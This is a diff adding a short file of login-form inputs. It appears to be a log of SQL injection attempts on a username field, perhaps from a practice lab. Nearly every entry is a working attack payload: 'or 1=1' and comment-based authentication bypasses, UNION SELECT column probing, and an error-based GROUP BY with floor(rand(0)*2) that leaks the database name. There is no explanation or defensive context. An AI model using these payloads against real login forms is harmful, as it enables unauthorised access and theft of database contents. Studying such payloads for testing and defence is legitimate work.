@@ -1,0 +1,30 @@
+User Name:\
+Password:
+User Name:1" or 1=1 #
+Password:
+User Name:admin' #
+Password:
+User Name:admin' #
+Password:
+User Name:admin' #
+Password:
+User Name:admin" #
+Password:
+User Name:1" #
+Password:
+User Name:1" or 1=1 #
+Password:
+User Name:1" union select 1,2,3 #
+Password:
+User Name:1" union select 1,2 #
+Password:
+User Name:1" union select 1,concat_ws("::", database(), 1) #
+Password:
+User Name:1" union select 1,count(*) from information_schema.tables group by concat_ws("::", database(), 1) #
+Password:
+User Name:1" union select 1,count(*) from information_schema.tables group by concat_ws("::", database(), floor(rand(0)*2)) #
+Password:
+User Name:1
+Password:1
+User Name:11
+Password:
